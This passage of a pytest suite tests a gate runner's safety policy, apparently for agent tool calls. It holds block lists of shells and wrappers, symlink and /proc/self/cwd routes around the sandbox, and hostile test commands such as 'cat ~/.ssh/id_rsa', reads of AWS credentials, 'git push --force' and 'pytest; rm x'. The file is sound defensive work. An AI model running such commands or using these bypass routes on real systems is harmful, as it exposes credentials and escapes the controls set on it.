        "/proc/self/root/bin/sh",
        "/proc/self/fd/3",
        "/dev/fd/3",
        "/dev/stdin",
        "/dev/null",
        "/dev/shm/tool",
        "//proc/self/cwd/mysh",
        "/./proc/self/cwd/mysh",
        "/proc/../proc/self/cwd/mysh",
        "/proc",
        "/dev",
        f"{deep}proc/self/cwd/mysh",
        f"{deep}dev/null",
    ]


@pytest.mark.parametrize("index", range(17))
def test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, spy: Spy, index: int
) -> None:
    """The judge's ATK5: /proc/self/cwd is the RUNNER's folder when the runner resolves it and the
    CHILD's folder when the child opens it, so any word under /proc or /dev is refused unresolved.
    """
    spy.block = True
    sub = tmp_path / "sub"
    shell = _fake_shell(tmp_path / "bin")
    sub.mkdir()
    (sub / "mysh").symlink_to(shell)
    monkeypatch.chdir(tmp_path)
    word = _proc_words(sub)[index]
    gate = G(argv=(word, "-c", "echo B > out.txt"), cwd="sub")
    got = plan_gate(gate, Workspace(tmp_path), False)
    why = "'..'" if ".." in word.split("/") else "/proc or /dev"
    assert isinstance(got, str) and why in got and "needle" not in got
    report = run(tmp_path, [gate])
    assert statuses(report) == ["policy-error"] and spy.calls == []
    assert not (sub / "out.txt").exists() and not (tmp_path / "out.txt").exists()


@pytest.mark.parametrize(
    "word", ["/proc/self/cwd/mysh", "/proc/thread-self/cwd/mysh", "/proc/self/cwd/./mysh"]
)
def test_the_real_cli_refuses_the_proc_cwd_bypass_and_creates_nothing(
    tmp_path: Path, word: str
) -> None:
    """The judge's repro: before the fix the child ran the shell (status pass, out.txt created)."""
    sub = tmp_path / "sub"
    shell = _fake_shell(tmp_path / "bin")
    sub.mkdir()
    (sub / "mysh").symlink_to(shell)
    gf = write(tmp_path, doc({"id": "a", "argv": [word, "-c", "x"], "cwd": "sub"}))
    proc = cli(str(gf), cwd=tmp_path)
    assert proc.returncode == 2 and json.loads(proc.stdout)["gates"][0]["status"] == "policy-error"
    assert not (sub / "out.txt").exists()


@pytest.mark.parametrize("entry", ["/proc/self/cwd", "/dev/fd", "/proc", "/dev/shm"])
def test_a_path_entry_under_proc_or_dev_refuses_a_bare_name(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, spy: Spy, entry: str
) -> None:
    spy.block = True
    sub = tmp_path / "sub"
    shell = _fake_shell(tmp_path / "bin")
    sub.mkdir()
    (sub / "mytool").symlink_to(shell)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("PATH", f"{entry}:/usr/bin:/bin")
    got = plan_gate(G(argv=("mytool", "-c", "a"), cwd="sub"), Workspace(tmp_path), False)
    assert isinstance(got, str) and "/proc or /dev" in got


def test_a_relative_path_entry_that_is_a_link_into_proc_refuses_a_bare_name(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (tmp_path / "pdir").symlink_to("/proc/self/cwd")
    monkeypatch.setenv("PATH", "pdir")
    got = plan(tmp_path, argv=("mytool", "-c", "a"))
    assert isinstance(got, str) and "/proc or /dev" in got


@pytest.mark.parametrize(
    "kind", ["file-link", "dir-link", "chain", "dev-link", "dotdot-link", "root-link"]
)
def test_a_symlink_in_the_gate_folder_that_leads_into_proc_or_dev_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, kind: str
) -> None:
    sub = tmp_path / "sub"
    sub.mkdir()
    _fake_shell(sub, "mysh")
    if kind == "file-link":
        (sub / "lnk").symlink_to("/proc/self/cwd/mysh")
        word = "./lnk"
    elif kind == "dir-link":
        (sub / "d").symlink_to("/proc/self/cwd")
        word = "d/mysh"
    elif kind == "chain":
        (sub / "l2").symlink_to("/proc/self/cwd/mysh")
        (sub / "l1").symlink_to("l2")
        word = "./l1"
    elif kind == "root-link":  # d -> /, so d/proc/self/cwd/mysh IS /proc/self/cwd/mysh
        (sub / "d").symlink_to("/")
        word = "d/proc/self/cwd/mysh"
    elif kind == "dotdot-link":  # d -> /dev, so d/../dev/null IS /dev/null (".." after the link)
        (sub / "d").symlink_to("/dev")
        word = "d/../dev/null"
    else:
        (sub / "lnk").symlink_to("/dev/null")
        word = "./lnk"
    monkeypatch.chdir(tmp_path)
    got = plan_gate(G(argv=(word, "-c", "a"), cwd="sub"), Workspace(tmp_path), False)
    why = "'..'" if kind == "dotdot-link" else "/proc or /dev"
    assert isinstance(got, str) and why in got


def test_a_path_hit_that_is_a_link_into_proc_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The hit is found through the RUNNER's /proc/self/cwd (an executable `mysh` in the runner's
    folder), a harmless name; the child would open its own cwd instead."""
    run_dir, sub = tmp_path / "run", tmp_path / "sub"
    harmless = run_dir / "mysh"
    run_dir.mkdir()
    harmless.write_text("#!/bin/sh\nexit 0\n")
    harmless.chmod(0o755)
    sub.mkdir()
    (sub / "mytool").symlink_to("/proc/self/cwd/mysh")
    monkeypatch.chdir(run_dir)
    monkeypatch.setenv("PATH", str(sub))
    got = plan_gate(G(argv=("mytool", "-c", "a"), cwd="sub"), Workspace(tmp_path), False)
    assert isinstance(got, str) and "/proc or /dev" in got


def test_the_proc_refusal_never_echoes_the_word(tmp_path: Path) -> None:
    got = plan(tmp_path, argv=("/dev/needle-77/bin", "-c", "x"))
    assert isinstance(got, str) and "/proc or /dev" in got and "needle" not in got


def test_a_link_loop_is_refused_not_followed_forever(tmp_path: Path) -> None:
    (tmp_path / "a").symlink_to("b")
    (tmp_path / "b").symlink_to("a")
    got = plan(tmp_path, argv=("./a",))
    assert isinstance(got, str) and "link loop" in got


def test_only_the_executable_word_is_looked_at_for_proc_and_dev(tmp_path: Path) -> None:
    """The cost of the rule: an executable under /proc or /dev (also /dev/shm) is refused; arguments,
    `python -c` bodies and wrapper arguments are not touched, nor is a declared shell gate."""
    for argv in [
        ("python", "-c", "open('/dev/null')"),
        ("python", "/proc/self/status"),
        ("cat", "/dev/null"),
        ("env", "python", "-V", "/dev/null"),
    ]:
        assert isinstance(plan(tmp_path, argv=argv), Plan), argv
    got = plan(tmp_path, command="cat /proc/self/status > /dev/null", shell=True, allow_shell=True)
    assert isinstance(got, Plan)


def test_the_first_path_hit_wins_not_the_last(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """ATK6 / the judge's K08: d1/mytool is a link to a shell, d2/mytool a harmless executable. The
    child runs d1's, so the plan must refuse. Independent of root or not, and of busybox."""
    shell = _fake_shell(tmp_path / "real")
    (tmp_path / "d1").mkdir()
    (tmp_path / "d1" / "mytool").symlink_to(shell)
    harmless = tmp_path / "d2" / "mytool"
    harmless.parent.mkdir()
    harmless.write_text("#!/bin/sh\nexit 0\n")
    harmless.chmod(0o755)
    monkeypatch.setenv("PATH", f"{tmp_path / 'd1'}:{tmp_path / 'd2'}")
    got = plan(tmp_path, argv=("mytool", "-c", "a"))
    assert isinstance(got, str) and "--allow-shell" in got
    monkeypatch.setenv("PATH", f"{tmp_path / 'd2'}:{tmp_path / 'd1'}")  # harmless first: accepted
    assert isinstance(plan(tmp_path, argv=("mytool", "-c", "a")), Plan)


@pytest.mark.parametrize("earlier", ["no-shebang", "missing-interpreter"])
def test_the_stated_limit_an_earlier_path_file_that_exec_skips_is_accepted(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, earlier: str
) -> None:
    """Documented limit (module docstring, Does not cover): an executable earlier on PATH that exec
    skips for another reason (ENOEXEC without a shebang, ENOENT for a missing interpreter), then a
    shell link of the same name: the plan accepts it, the child runs the shell."""
    first = tmp_path / "first"
    first.mkdir()
    bad = first / "mytool"
    bad.write_text("plain data\n" if earlier == "no-shebang" else "#!/nonexistent/interpreter\n")
    bad.chmod(0o755)
    shell = _fake_shell(tmp_path / "real")
    (tmp_path / "second").mkdir()
    (tmp_path / "second" / "mytool").symlink_to(shell)
    monkeypatch.setenv("PATH", f"{first}:{tmp_path / 'second'}")
    assert isinstance(plan(tmp_path, argv=("mytool", "-c", "a")), Plan)


def test_a_declared_shell_gate_still_runs_through_sh_when_allowed(tmp_path: Path) -> None:
    got = plan(tmp_path, command="bash -c 'a; b'", shell=True, allow_shell=True)
    assert isinstance(got, Plan) and got.argv == ("/bin/sh", "-c", "bash -c 'a; b'")
    report = run(tmp_path, [G(command="echo A; echo B > out.txt", shell=True)], allow_shell=True)
    assert statuses(report) == ["pass"] and (tmp_path / "out.txt").read_text() == "B\n"


@pytest.mark.parametrize("how", ["path", "bare"])
def test_a_symlink_that_points_at_a_shell_is_refused_whatever_it_is_called(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, how: str
) -> None:
    target = shutil.which("sh")
    assert target is not None
    (tmp_path / "gate-runner").symlink_to(target)
    monkeypatch.setenv("PATH", str(tmp_path))
    word = str(tmp_path / "gate-runner") if how == "path" else "gate-runner"
    got = plan(tmp_path, argv=(word, "-c", "a"))
    assert isinstance(got, str) and "shell" in got


def test_a_file_named_sh_is_refused_by_name_even_when_it_is_not_a_shell(tmp_path: Path) -> None:
    (tmp_path / "sh").write_text("#!/bin/sh\nexit 0\n")
    (tmp_path / "sh").chmod(0o755)
    got = plan(tmp_path, argv=(str(tmp_path / "sh"),))
    assert isinstance(got, str) and "shell" in got


def test_a_shell_gate_in_a_file_spawns_nothing_and_exits_2(tmp_path: Path) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": ["sh", "-c", "echo B > out.txt"]}))
    proc = cli(str(gf), "--root", str(tmp_path), cwd=tmp_path)
    assert proc.returncode == 2 and not (tmp_path / "out.txt").exists()
    report = json.loads(proc.stdout)
    assert (
        report["gates"][0]["status"] == "policy-error"
        and "--allow-shell" in report["gates"][0]["message"]
    )


def test_the_shell_check_never_runs_on_a_declared_shell_gate_argv(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def boom(argv: Any, cwd: Any) -> str | None:
        raise AssertionError("called")

    monkeypatch.setattr(gm, "_shell_refusal", boom)
    got = plan(tmp_path, command="a && b", shell=True, allow_shell=True)
    assert isinstance(got, Plan)


def test_the_shell_check_covers_the_list_form_and_the_string_form_the_same_way(
    tmp_path: Path,
) -> None:
    for argv in [("sh",), ("env", "bash"), ("/bin/dash", "-c", "x")]:
        a = plan(tmp_path, argv=argv)
        b = plan(tmp_path, command=shlex.join(argv))
        assert isinstance(a, str) and a == b


ALL_SHELLS = sorted(
    {"sh", "bash", "dash", "ash", "ksh", "mksh", "pdksh", "posh", "yash", "zsh", "fish", "csh", "tcsh", "rbash"}
)  # fmt: skip
ALL_WRAPPERS = sorted(
    {"env", "xargs", "busybox", "toybox", "nohup", "exec", "command", "builtin", "sudo", "doas", "timeout",
     "nice", "ionice", "setsid", "stdbuf", "chroot", "find", "flock", "unshare", "strace", "time", "chrt",
     "taskset", "script", "runuser", "setpriv", "nsenter", "ssh", "parallel"}
)  # fmt: skip


def test_shell_names_and_wrappers_are_the_documented_lists() -> None:
    assert gm.SHELL_NAMES == set(ALL_SHELLS)
    assert gm.WRAPPERS == set(ALL_WRAPPERS)
    assert gm.SHELL_RUNNERS == {"su", "watch"}
    assert gm.HANDLED_SIGNALS == (signal.SIGTERM, signal.SIGHUP)


@pytest.mark.parametrize("name", ALL_SHELLS)
def test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper(
    tmp_path: Path, name: str
) -> None:
    for argv in [(name, "-c", "a"), ("env", name), (f"/opt/x/{name.upper()}.EXE", "-c", "a")]:
        got = plan(tmp_path, argv=argv)
        assert isinstance(got, str) and "--allow-shell" in got, argv


@pytest.mark.parametrize("wrapper", ALL_WRAPPERS)
def test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise(
    tmp_path: Path, wrapper: str
) -> None:
    refused = plan(tmp_path, argv=(wrapper, "-x", "/usr/bin/Bash"))
    assert isinstance(refused, str) and "wrapper" in refused and "--allow-shell" in refused
    ok = plan(tmp_path, argv=(wrapper, "-x", "pytest"))
    assert isinstance(ok, Plan)


@pytest.mark.parametrize("runner_name", ["su", "watch"])
def test_programs_that_run_a_shell_by_design_are_refused_outright(
    tmp_path: Path, runner_name: str
) -> None:
    got = plan(tmp_path, argv=(runner_name, "-n", "5", "pytest"))
    assert isinstance(got, str) and "--allow-shell" in got


def test_shell_gate_needs_the_caller_flag(tmp_path: Path) -> None:
    got = plan(tmp_path, command="cd x && y", shell=True)
    assert isinstance(got, str) and "--allow-shell" in got


def test_shell_gate_is_refused_without_posix(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(gm, "os", types.SimpleNamespace(name="nt"))
    got = plan(tmp_path, command="cd x && y", shell=True, allow_shell=True)
    assert got == "shell gates need a POSIX shell"


@pytest.mark.parametrize("line", ["", "   ", "\n"])
def test_shell_gate_empty_command(tmp_path: Path, line: str) -> None:
    assert plan(tmp_path, command=line, shell=True, allow_shell=True) == "empty command"


def test_shell_gate_length_boundary(tmp_path: Path) -> None:
    assert isinstance(
        plan(tmp_path, command="echo " + "a" * 4091, shell=True, allow_shell=True), Plan
    )
    got = plan(tmp_path, command="echo " + "a" * 4092, shell=True, allow_shell=True)
    assert got == "command is too long"


def test_shell_gate_nul_is_refused(tmp_path: Path) -> None:
    got = plan(tmp_path, command="echo a\x00b", shell=True, allow_shell=True)
    assert isinstance(got, str) and "NUL" in got


def test_shell_gate_keeps_metacharacters_and_newlines(tmp_path: Path) -> None:
    line = "echo a | cat\necho b"
    got = plan(tmp_path, command=line, shell=True, allow_shell=True)
    assert isinstance(got, Plan) and got.argv[2] == line


# --- the command guard and the sensitive-path denylist apply to gate argv ----------------


@pytest.mark.parametrize(
    "kw",
    [
        {"command": "git push --force"},
        {"command": "git push --force origin main"},
        {"argv": ("git", "push", "--force")},
        {"argv": ("git", "push", "--force", "origin", "main")},
        {"command": "cat ~/.ssh/id_rsa"},
        {"command": "cat " + os.path.expanduser("~/.ssh/id_rsa")},
        {"argv": ("cat", os.path.expanduser("~/.ssh/id_rsa"))},
        {"argv": ("cat", os.path.expanduser("~/.aws/credentials"))},
        {"argv": ("python", "-c", "x", os.path.expanduser("~/.netrc"))},
        {"command": "git push --force origin main", "shell": True},
        {"command": "cat ~/.ssh/id_rsa", "shell": True},
        {"command": "sh -c 'git push --force'", "shell": True},
    ],
    ids=lambda kw: json.dumps(kw)[:60],
)
def test_guard_denial_is_a_policy_error(tmp_path: Path, spy: Spy, kw: dict[str, Any]) -> None:
    spy.block = True
    report = run(tmp_path, [G(**kw)], allow_shell=True)
    assert statuses(report) == ["policy-error"]
    assert report.gates[0].message.startswith("Blocked by safety policy (rule ")
    assert spy.calls == []


@pytest.mark.parametrize(
    "kw",
    [
        {"command": "needle-77; x"},
        {"command": "needle-77 'unbalanced"},
        {"command": "needle-77 \x00"},
        {"command": "x" * 5000 + " needle-77"},
        {"argv": ("-needle-77",)},
        {"argv": ("needle=77", "x")},
        {"argv": ("echo", "needle-77\x00")},
        {"argv": ("echo", "a" * 5000, "needle-77")},
        {"argv": ("git", "push", "--force", "needle-77")},
        {"argv": ("/needle-77/bash", "-c", "x")},
        {"argv": ("env", "needle-77", "sh")},
        {"command": "needle-77/dash -c id"},
        {"argv": ("echo",), "cwd": "../needle-77"},
        {"argv": ("echo",), "cwd": "needle-77"},
    ],
    ids=lambda kw: json.dumps(kw)[:50],
)
def test_a_refusal_never_echoes_the_command_or_cwd(tmp_path: Path, kw: dict[str, Any]) -> None:
    got = plan(tmp_path, allow_shell=False, **kw)
    assert isinstance(got, str) and "needle-77" not in got
    report = run(tmp_path, [G("only", **kw)], allow_shell=True)
    assert "needle-77" not in json.dumps(gm.asdict(report))


def test_guard_allows_ordinary_gates(tmp_path: Path) -> None:
    for kw in (
        {"command": "python -m pytest -q tests"},
        {"command": "ruff check src tests"},
        {"command": "mypy --strict src"},
        {"command": "git diff --exit-code"},
        {"command": "git push origin feature"},
        {"argv": (PY, "-c", "print(1)")},
        {"command": "cd web && make check && make docs", "shell": True},
    ):
        assert isinstance(plan(tmp_path, allow_shell=True, **kw), Plan), kw


def test_guard_runs_on_the_joined_argv_and_is_called_once(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    seen: list[Any] = []

    def fake(call: Any) -> str | None:
        seen.append((call.arguments["command"], call.arguments["cwd"]))
        return "deny"

    monkeypatch.setattr(gm, "guard_tool_call", fake)
    assert plan(tmp_path, command="pytest -k 'a b'") == "deny"
    assert plan(tmp_path, argv=("echo", "a b")) == "deny"
    assert plan(tmp_path, command="a && b", shell=True, allow_shell=True) == "deny"
    here = str(tmp_path.resolve())
    assert seen == [("pytest -k 'a b'", here), ("echo 'a b'", here), ("a && b", here)]


def test_a_guard_crash_is_a_refusal_not_a_spawn(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, spy: Spy
) -> None:
    spy.block = True

    def boom(call: Any) -> str | None:
        raise RuntimeError("synthetic")

    monkeypatch.setattr(gm, "guard_tool_call", boom)
    report = run(tmp_path, [P("pass")])
    assert statuses(report) == ["policy-error"] and report.gates[0].message == "policy check failed"
    assert "synthetic" not in json.dumps(gm.asdict(report)) and spy.calls == []


@pytest.mark.parametrize("sub", [".ssh/keys", ".ssh", ".kube", ".aws", ".config/gcloud"])
def test_a_credential_folder_is_refused_as_cwd_even_inside_the_root(
    tmp_path: Path, spy: Spy, sub: str
) -> None:
    spy.block = True
    (tmp_path / sub).mkdir(parents=True)
    report = run(tmp_path, [P("pass", cwd=sub)])
    assert (
        statuses(report) == ["policy-error"] and "(rule sensitive-path)" in report.gates[0].message
    )
    assert spy.calls == []


# --- the cwd fence -----------------------------------------------------------------------


def test_cwd_default_is_the_root_and_child_runs_there(tmp_path: Path) -> None:
    report = run(tmp_path, [P("import os; print(os.getcwd())")])
    assert report.gates[0].stdout_tail == str(tmp_path.resolve()) + "\n"


def test_cwd_subfolder_is_honoured_by_the_child(tmp_path: Path) -> None:
    (tmp_path / "sub").mkdir()
    report = run(tmp_path, [P("import os; print(os.getcwd())", cwd="sub")])
    assert report.gates[0].stdout_tail == str((tmp_path / "sub").resolve()) + "\n"


def test_cwd_dot_dot_inside_the_root_is_fine(tmp_path: Path) -> None:
    (tmp_path / "sub").mkdir()
    assert isinstance(plan(tmp_path, argv=("echo",), cwd="sub/../sub"), Plan)


def test_cwd_outside_the_root_is_refused(tmp_path: Path, spy: Spy) -> None:
    spy.block = True
    root = tmp_path / "root"
    root.mkdir()
    (tmp_path / "outside").mkdir()
    (root / "link").symlink_to(tmp_path / "outside")
    for cwd in ("..", "../outside", str(tmp_path), "/", "/tmp", "link", "link/.."):
        report = run_gates([P("pass", cwd=cwd)], Workspace(root))
        assert statuses(report) == ["policy-error"], cwd
        assert report.gates[0].message.startswith("cwd refused"), cwd
    assert spy.calls == []


@pytest.mark.parametrize("cwd", ["", "   ", "a\x00b", "a|b", "CON", "C:\\x", "//host/share"])
def test_cwd_lexical_refusals(tmp_path: Path, cwd: str) -> None:
    got = plan(tmp_path, argv=("echo",), cwd=cwd)
    assert isinstance(got, str) and got.startswith("cwd refused")


def test_cwd_must_be_an_existing_folder(tmp_path: Path) -> None:
    (tmp_path / "file.txt").write_text("x")
    assert plan(tmp_path, argv=("echo",), cwd="file.txt") == "cwd is not a folder"
    assert plan(tmp_path, argv=("echo",), cwd="missing") == "cwd is not a folder"


def test_shell_gates_are_fenced_too(tmp_path: Path) -> None:
    got = plan(tmp_path, command="echo a", shell=True, allow_shell=True, cwd="..")
    assert isinstance(got, str) and got.startswith("cwd refused")


# --- the spawn ---------------------------------------------------------------------------


def test_spawn_arguments(tmp_path: Path, spy: Spy, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("GATETEST_PLAIN", "kept")
    monkeypatch.setenv("GATETEST_API_TOKEN", "dropped")
    run(tmp_path, [P("pass", timeout_s=20)])
    (args, kwargs), *rest = spy.calls
    assert not rest and args[0] == [PY, "-c", "pass"]
    assert not kwargs.get("shell", False)
    assert kwargs["cwd"] == str(tmp_path.resolve())
    assert kwargs["stdin"] == subprocess.DEVNULL
    assert kwargs["start_new_session"] is True
    assert kwargs["env"]["GATETEST_PLAIN"] == "kept" and "GATETEST_API_TOKEN" not in kwargs["env"]
    assert "PATH" in kwargs["env"]


def test_one_spawn_per_gate_in_declared_order(tmp_path: Path, spy: Spy) -> None:
    gates = [P(f"print({i})", id=f"g{i}") for i in range(5)]
    report = run(tmp_path, gates)
    assert [r.id for r in report.gates] == [f"g{i}" for i in range(5)]
    assert [r.stdout_tail for r in report.gates] == [f"{i}\n" for i in range(5)]
    assert len(spy.calls) == 5


def test_stdin_is_closed_not_inherited(tmp_path: Path) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "import sys; sys.exit(sys.stdin.read() != '')"],
                              "timeout_s": 10}))  # fmt: skip
    env = {**os.environ, "PYTHONPATH": str(SRC)}
    with open(tmp_path / "out.json", "w") as out:
        proc = subprocess.Popen(
            [PY, "-m", "master_finhub.evals.gates", str(gf)],
            stdin=subprocess.PIPE, stdout=out, env=env, cwd=tmp_path,
        )  # fmt: skip
        try:
            code = proc.wait(timeout=60)  # stdin stays OPEN on our side: an inherited stdin hangs
        finally:
            assert proc.stdin is not None
            proc.stdin.close()
    assert code == 0


def test_env_is_scrubbed(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    for name in (
        "GATETEST_API_KEY",
        "GATETEST_DB_PASSWORD",
        "GATETEST_SECRET",
        "GATETEST_AUTH_TOKEN",
        "gatetest_lower_token",
    ):
        monkeypatch.setenv(name, "zq-value-" + name)
    monkeypatch.setenv("GATETEST_PLAIN", "kept")
    report = run(tmp_path, [P("import os, json; print(json.dumps(sorted(os.environ)))")])
    names = json.loads(report.gates[0].stdout_tail)
    assert "GATETEST_PLAIN" in names and "PATH" in names
    assert not [n for n in names if n.upper().startswith("GATETEST_") and n != "GATETEST_PLAIN"]
    assert "gatetest_lower_token" not in names
    assert "zq-value-" not in json.dumps(gm.asdict(report))


def test_exit_code_mapping(tmp_path: Path) -> None:
    gates = [
        P("pass", id="ok"),
        P("import sys; sys.exit(1)", id="one"),
        P("import sys; sys.exit(3)", id="three"),
        P("import sys; sys.exit(255)", id="max"),
        P("import os, signal; os.kill(os.getpid(), signal.SIGKILL)", id="kill"),
        P("import os, signal; os.kill(os.getpid(), signal.SIGTERM)", id="term"),
        P("raise SystemExit", id="bare"),
        P("raise RuntimeError('x')", id="raise"),
    ]
    got = {r.id: (r.status, r.exit_code) for r in run(tmp_path, gates).gates}
    msgs = {r.id: r.message for r in run(tmp_path, gates).gates}
    assert msgs["three"] == "exit code 3" and msgs["kill"] == "killed by signal 9"
    assert msgs["term"] == "killed by signal 15" and msgs["ok"] == ""
    assert got == {
        "ok": ("pass", 0),
        "one": ("fail", 1),
        "three": ("fail", 3),
        "max": ("fail", 255),
        "kill": ("fail", -9),
        "term": ("fail", -15),
        "bare": ("pass", 0),
        "raise": ("fail", 1),
    }


def test_signal_death_message_and_exit_1(tmp_path: Path) -> None:
    report = run(tmp_path, [P("import os, signal; os.kill(os.getpid(), signal.SIGKILL)")])
    assert report.gates[0].message == "killed by signal 9" and exit_code(report) == 1


def test_a_silent_gate_with_exit_0_passes_and_a_noisy_failure_fails(tmp_path: Path) -> None:
    report = run(
        tmp_path,
        [P("pass", id="quiet"), P("import sys; print('all good'); sys.exit(2)", id="liar")],
    )
    assert statuses(report) == ["pass", "fail"]


def test_missing_executable_is_an_error_not_a_pass(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # A PATH entry the user cannot search (a root-only home) makes execvp report EACCES instead of
    # ENOENT; pin a PATH every user can search so the message is the same everywhere.
    monkeypatch.setenv("PATH", str(tmp_path))
    report = run(tmp_path, [G(argv=("c9-no-such-binary",))])
    assert statuses(report) == ["error"] and report.gates[0].exit_code is None
    assert report.gates[0].message == "executable or folder not found" and exit_code(report) == 1


def test_not_executable_is_an_error(tmp_path: Path) -> None:
    script = tmp_path / "noexec"
    script.write_text("#!/bin/sh\nexit 0\n")
    script.chmod(0o644)
    report = run(tmp_path, [G(argv=(str(script),))])
    assert statuses(report) == ["error"]
    assert report.gates[0].message == "not executable or not permitted"


def test_other_spawn_failures_are_errors_without_the_exception_text(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def boom(*a: Any, **k: Any) -> Any:
        raise OSError(7, "synthetic secret-ish text")

    monkeypatch.setattr(gm, "stream_process", boom)
    report = run(tmp_path, [P("pass")])
    assert statuses(report) == ["error"] and report.gates[0].message == "could not start (OSError)"
    assert "synthetic" not in json.dumps(gm.asdict(report))


def test_unexpected_exception_while_collecting_is_an_error(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def boom(*a: Any, **k: Any) -> Any:
        raise RuntimeError("synthetic")

    monkeypatch.setattr(gm, "collect", boom)
    assert statuses(run(tmp_path, [P("pass")])) == ["error"]


def test_keyboard_interrupt_is_not_swallowed(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def boom(*a: Any, **k: Any) -> Any:
        raise KeyboardInterrupt

    monkeypatch.setattr(gm, "collect", boom)
    with pytest.raises(KeyboardInterrupt):
        run(tmp_path, [P("pass")])


def test_missing_exit_status_is_an_error(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(gm, "collect", lambda *a, **k: ExecResult(None, "", "", False, False))
    report = run(tmp_path, [P("pass")])
    assert statuses(report) == ["error"] and report.gates[0].message == "no exit status"


def test_timeout_outranks_an_exit_code_of_zero(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(gm, "collect", lambda *a, **k: ExecResult(0, "x", "", False, True))
    assert statuses(run(tmp_path, [P("pass")])) == ["timeout"]


def test_timeout_keeps_the_output_so_far(tmp_path: Path) -> None:
    code = "import time; print('started', flush=True); time.sleep(30)"
    report = run(tmp_path, [P(code, timeout_s=0.6)])
    assert statuses(report) == ["timeout"] and report.gates[0].stdout_tail == "started\n"
    assert report.gates[0].message == "timed out after 0.6s"


def test_timeout_kills_the_whole_process_group(tmp_path: Path) -> None:
    marker = tmp_path / "grandchild-ran"
    grandchild = (
        "import sys, time, pathlib; time.sleep(2); pathlib.Path(sys.argv[1]).write_text('x')"
    )
    parent = (
        "import subprocess, sys, time\n"
        f"subprocess.Popen([sys.executable, '-c', {grandchild!r}, sys.argv[1]])\n"
        "time.sleep(60)\n"
    )
    report = run(tmp_path, [G(argv=(PY, "-c", parent, str(marker)), timeout_s=0.5)])
    assert statuses(report) == ["timeout"]
    time.sleep(3)
    assert not marker.exists()


def test_a_daemonised_grandchild_holding_the_pipe_is_a_timeout_not_a_pass(tmp_path: Path) -> None:
    parent = (
        "import subprocess, sys\n"
        "subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(60)'])\n"
    )
    report = run(tmp_path, [P(parent, timeout_s=0.6)])
    assert statuses(report) == ["timeout"] and not report.ok


def test_every_gate_runs_after_a_failure(tmp_path: Path) -> None:
    gates = [
        P("import sys; sys.exit(1)", id="first"),
        P(f"open({str(tmp_path / 'second')!r}, 'w').close()", id="second"),
        P("import time; time.sleep(30)", id="third", timeout_s=0.3),
        P(f"open({str(tmp_path / 'fourth')!r}, 'w').close()", id="fourth"),
    ]
    report = run(tmp_path, gates)
    assert statuses(report) == ["fail", "pass", "timeout", "pass"]
    assert (tmp_path / "second").exists() and (tmp_path / "fourth").exists()
    assert (report.passed, report.failed, report.total, report.ok) == (2, 2, 4, False)
    assert exit_code(report) == 1


def test_all_pass_is_ok_and_exit_0(tmp_path: Path) -> None:
    report = run(tmp_path, [P("pass", id="a"), P("print(1)", id="b")])
    assert (report.passed, report.failed, report.total, report.ok) == (2, 0, 2, True)
    assert exit_code(report) == 0


def test_a_single_failure_among_many_passes_is_not_ok(tmp_path: Path) -> None:
    gates = [P("pass", id=f"p{i}") for i in range(4)] + [P("import sys; sys.exit(9)", id="bad")]
    report = run(tmp_path, gates)
    assert (report.passed, report.failed, report.ok) == (4, 1, False) and exit_code(report) == 1


def test_duplicate_ids_never_swallow_a_gate(tmp_path: Path) -> None:
    report = run(tmp_path, [P("pass", id="same"), P("import sys; sys.exit(1)", id="same")])
    assert statuses(report) == ["pass", "fail"] and report.total == 2 and not report.ok


# --- policy errors spawn nothing, and later gates do not run ------------------------------


REFUSED = [
    G("bad", command="pytest; rm x"),
    G("bad", command="pytest 'unbalanced"),
    G("bad", command=""),
    G("bad", argv=()),
    G("bad", argv=("-x",)),
    G("bad", argv=("A=b", "x")),
    G("bad", argv=("git", "push", "--force")),
    G("bad", argv=("cat", os.path.expanduser("~/.ssh/id_rsa"))),
    G("bad", argv=("echo",), cwd=".."),
    G("bad", command="echo a && echo b", shell=True),
    G("bad", argv=("sh", "-c", "echo A; echo B > out.txt")),
    G("bad", command="bash -c ls"),
    G("bad", argv=("env", "sh", "-c", "a;b")),
]


@pytest.mark.parametrize("position", ["first", "middle", "last"])
@pytest.mark.parametrize("bad", REFUSED, ids=lambda g: f"{g.command or g.argv}"[:40])
def test_a_refused_gate_spawns_nothing_and_skips_every_gate(
    tmp_path: Path, spy: Spy, bad: Gate, position: str
) -> None:
    spy.block = True
    marker = tmp_path / "ran"
    good = [P(f"open({str(marker)!r}, 'w').close()", id=f"good{i}") for i in range(2)]
    gates = {"first": [bad, *good], "middle": [good[0], bad, good[1]], "last": [*good, bad]}[
        position
    ]
    report = run(tmp_path, gates)
    assert [r.status for r in report.gates if r.id == "bad"] == ["policy-error"]
    assert [r.status for r in report.gates if r.id != "bad"] == ["not-run", "not-run"]
    assert spy.calls == [] and not marker.exists()
    assert not report.ok and report.passed == 0 and exit_code(report) == 2
